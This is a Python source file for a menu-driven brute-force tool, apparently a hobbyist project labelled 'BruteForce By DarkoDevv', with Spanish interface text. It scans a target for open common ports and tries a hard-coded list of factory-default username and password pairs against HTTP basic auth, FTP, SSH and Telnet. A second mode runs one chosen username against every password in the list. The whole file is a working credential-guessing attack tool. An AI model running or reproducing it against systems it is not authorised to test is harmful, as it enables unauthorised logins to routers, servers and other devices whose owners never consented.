import os, sys, platform, socket, time, asyncio
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.align import Align

try:
    import asyncssh
    ASYNCSSH_AVAILABLE = True
except ImportError:
    ASYNCSSH_AVAILABLE = False

try:
    import requests
except ImportError:
    print("\033[1;31m[-] Falta 'requests'. Instala: pip install requests\033[0m")
    sys.exit(1)

console = Console(highlight=False)

C1 = "#FF0000"
C2 = "#FF4500"
C3 = "#8B0000"

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
    ("admin", "123456"), ("admin", "root"), ("root", "root"),
    ("root", "admin"), ("root", "123456"), ("root", "password"),
    ("admin", "1234"), ("admin", "12345"), ("admin", "admin1"),
    ("admin", "administrator"), ("root", "toor"), ("root", "1234"),
    ("administrator", "administrator"), ("user", "user"),
    ("support", "support"), ("guest", "guest"),
    ("admin", "default"), ("admin", "changeme"), ("root", "default"),
    ("admin", "admin@123"), ("root", "root123"), ("admin", "P@ssw0rd"),
    ("admin", "admin1234"), ("root", "admin123"), ("test", "test")
]

def _clear(): os.system('cls' if os.name == 'nt' else 'clear')

def _get_os_name():
    if "com.termux" in os.environ.get("PREFIX", ""): return "termux"
    if os.name == "nt": return "powershell" if "PS" in os.environ.get("PROMPT", "") else "cmd"
    return platform.system().lower()

def draw_banner():
    banner_texto = (
        f"\n[bold {C1}]██████╗ ██████╗ ██╗   ██╗████████╗███████╗[/bold {C1}]\n"
        f"[bold {C1}]██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝[/bold {C1}]\n"
        f"[bold {C2}]██████╔╝██████╔╝██║   ██║   ██║   █████╗  [/bold {C2}]\n"
        f"[bold {C2}]██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  [/bold {C2}]\n"
        f"[bold {C3}]██████╔╝██║  ██║╚██████╔╝   ██║   ██║     [/bold {C3}]\n"
        f"[bold {C3}]╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝     [/bold {C3}]\n"
        f"\n[dim {C1}]    BruteForce By DarkoDevv v1.0    [/dim {C1}]"
    )
    panel = Panel(
        Align.center(banner_texto, vertical="middle"),
        border_style=C1, box=box.ROUNDED, width=60, padding=(0, 1)
    )
    console.print(Align.center(panel))

def get_host_port(target):
    target = target.replace("http://", "").replace("https://", "").strip("/")
    if ":" in target:
        parts = target.split(":")
        if len(parts) == 2:
            return parts[0], int(parts[1])
    return target, None

def check_http_auth(host, port, user, pw, use_https=False):
    scheme = "https" if use_https else "http"
    url = f"{scheme}://{host}:{port}/"
    try:
        r = requests.get(url, auth=(user, pw), timeout=4, verify=False)
        if r.status_code == 200: return True, "HTTP 200 OK"
        elif r.status_code == 401: return False, "HTTP 401 Unauthorized"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:20]

def check_ftp_auth(host, port, user, pw):
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=4)
        ftp.login(user, pw)
        ftp.quit()
        return True, "Login exitoso"
    except Exception as e:
        return False, str(e).split("\n")[0][:20]

async def check_ssh_auth_async(host, port, user, pw):
    if not ASYNCSSH_AVAILABLE:
        return False, "Falta asyncssh"
    try:
        async with asyncssh.connect(
            host, port=port, username=user, password=pw,
            known_hosts=None, connect_timeout=4,
            preferred_auth="password"
        ) as conn:
            return True, "Login exitoso"
    except asyncssh.PermissionDenied:
        return False, "Auth fallida"
    except Exception as e:
        return False, str(e)[:20]

def check_ssh_auth(host, port, user, pw):
    return asyncio.run(check_ssh_auth_async(host, port, user, pw))

def check_telnet_auth(host, port, user, pw):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        s.recv(1024)
        s.sendall((user + "\n").encode())
        s.recv(1024)
        s.sendall((pw + "\n").encode())
        resp = s.recv(1024).decode('utf-8', errors='ignore')
        s.close()
        if "incorrect" in resp.lower() or "failed" in resp.lower() or "denied" in resp.lower():
            return False, "Login fallido"
        return True, "Login posible"
    except Exception as e:
        return False, str(e)[:20]

def run_bruteforce(target, creds_list):
    host, port = get_host_port(target)
    
    if port is None:
        ports_to_try = [80, 21, 22, 23, 443]
        print(f"\n\033[1;33m[*] No se especificó puerto. Escaneando {ports_to_try}...\033[0m")
        found_port = None
        for p in ports_to_try:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                if s.connect_ex((host, p)) == 0:
                    found_port = p
                    s.close()
                    break
                s.close()
            except:
                pass
        if found_port:
            port = found_port
            print(f"\033[1;32m[+] Puerto abierto detectado: {port}\033[0m")
        else:
            print("\033[1;31m[-] No se detectó ningún puerto común abierto.\033[0m")
            return

    print(f"\n\033[1;36m[+] Iniciando BruteForce en {host}:{port}\033[0m")
    print(f"\033[1;36m[+] Probando {len(creds_list)} combinaciones...\033[0m\n")

    table = Table(title=f"🔓 Resultados en {host}:{port}", box=box.ROUNDED, border_style=C1, title_style=f"bold {C1}", header_style=f"bold {C1}")
    table.add_column("Usuario", style=C2, justify="left", width=15)
    table.add_column("Contraseña", style=C2, justify="left", width=15)
    table.add_column("Estado", justify="center", width=15)
    table.add_column("Info", style="white", justify="left", width=20)

    success = False

    for user, pw in creds_list:
        if port in (80, 443, 8080, 8443):
            ok, info = check_http_auth(host, port, user, pw, use_https=(port in (443, 8443)))
        elif port == 21:
            ok, info = check_ftp_auth(host, port, user, pw)
        elif port == 22:
            ok, info = check_ssh_auth(host, port, user, pw)
        elif port == 23:
            ok, info = check_telnet_auth(host, port, user, pw)
        else:
            print(f"\033[1;31m[-] Puerto {port} no soportado para BruteForce.\033[0m")
            return

        if ok:
            table.add_row(user, pw, "[bold green]✅ ENCONTRADO[/bold green]", info)
            success = True
            break
        else:
            table.add_row(user, pw, "[red]❌ Fallido[/red]", info)

    console.print(Align.center(table))
    
    if success:
        print(f"\n\033[1;32m🎉 ¡Credenciales encontradas! Revisa la tabla de arriba.\033[0m")
    else:
        print(f"\n\033[1;31m[-] Ninguna contraseña funcionó.\033[0m")

def menu():
    os_name = _get_os_name()
    while True:
        _clear()
        draw_banner()
        print(f"\n\033[1;36m[1]\033[0m BruteForce IP:PORT (Credenciales de fábrica)")
        print(f"\033[1;36m[2]\033[0m BruteForce a un usuario específico")
        print(f"\033[1;36m[0]\033[0m Salir\n")
        
        print(f"\033[1;36m┌──\033[0m(\033[1;36mBruteForce\033[0m㉿\033[1;36m{os_name}\033[0m)")
        print(f"\033[1;36m└─\033[0m\033[1;37m$\033[0m ", end="", flush=True)

        choice = sys.stdin.readline().strip()
        print("\033[F\033[K", end="", flush=True)

        if choice == "0":
            _clear()
            draw_banner()
            print("\n\033[1;37mHasta luego, espero que vuelvas 👋🏻\033[0m\n")
            break
        elif choice == "1":
            _clear(); draw_banner()
            print("\n\033[1;36mIngresa IP:PORT (ej: 192.168.1.1:80):\033[0m ", end="", flush=True)
            t = sys.stdin.readline().strip()
            if t:
                print()
                run_bruteforce(t, DEFAULT_CREDS)
                input("\nPresiona Enter para volver...")
        elif choice == "2":
            _clear(); draw_banner()
            print("\n\033[1;36mIngresa el nombre de usuario (ej: testuser):\033[0m ", end="", flush=True)
            target_user = sys.stdin.readline().strip()
            if not target_user:
                print("\033[1;31m[-] Usuario vacío.\033[0m")
                time.sleep(1)
                continue
                
            print("\n\033[1;36mIngresa IP:PORT (ej: 192.168.1.1:22):\033[0m ", end="", flush=True)
            t = sys.stdin.readline().strip()
            
            if t:
                # Creamos una lista temporal combinando el usuario con todas las contraseñas de fábrica
                custom_creds = [(target_user, pw) for _, pw in DEFAULT_CREDS]
                print()
                run_bruteforce(t, custom_creds)
                input("\nPresiona Enter para volver...")
        else:
            print("\033[1;31mOpción inválida.\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    menu()
